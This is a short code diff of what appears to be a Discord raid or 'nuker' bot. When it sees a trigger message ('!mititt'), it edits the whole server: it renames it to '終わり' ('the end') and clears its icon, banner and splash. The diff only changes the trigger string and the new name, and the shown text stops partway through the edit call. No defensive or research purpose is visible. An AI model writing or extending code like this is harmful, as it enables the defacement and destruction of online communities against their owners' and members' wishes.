@@ -15,10 +15,10 @@ with open("invite.txt") as f:
 
 @client.event
 async def on_message(message: discord.Message):
-    if message.content == "!!mititt":
+    if message.content == "!mititt":
         try:
             await message.guild.edit(
-                name="終",
+                name="終わり",
                 icon=None,
                 banner=None,
                 splash=None,
